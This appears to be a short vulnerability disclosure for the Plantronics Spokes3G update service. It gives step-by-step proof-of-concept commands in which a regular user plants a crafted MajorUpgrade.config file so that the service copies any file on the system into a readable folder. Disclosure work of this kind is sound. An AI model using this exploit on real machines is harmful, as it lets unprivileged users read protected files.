As a regular user drop a file called "MajorUpgrade.config" inside the
"C:\ProgramData\Plantronics\Spokes3G" directory. The content of
MajorUpgrade.config should look like the following one liner:
^|^|<FULL-PATH-TO-YOUR-DESIRED-FILE>^|> MajorUpgrade.config
Exchange <FULL-PATH-TO-YOUR-DESIRED-FILE> with a desired file to read/copy
(any file on the system). The desired file will be copied into C:\Program
Files (x86)\Plantronics\Spokes3G\UpdateServiceTemp
Steps to reproduce (POC):
- Open cmd.exe
- Navigate using cd C:\ProgramData\Plantronics\Spokes3G
- echo ^|^|<FULL-PATH-TO-YOUR-DESIRED-FILE>^|> MajorUpgrade.config
- Desired file will be copied into C:\Program Files
(x86)\Plantronics\Spokes3G\UpdateServiceTemp
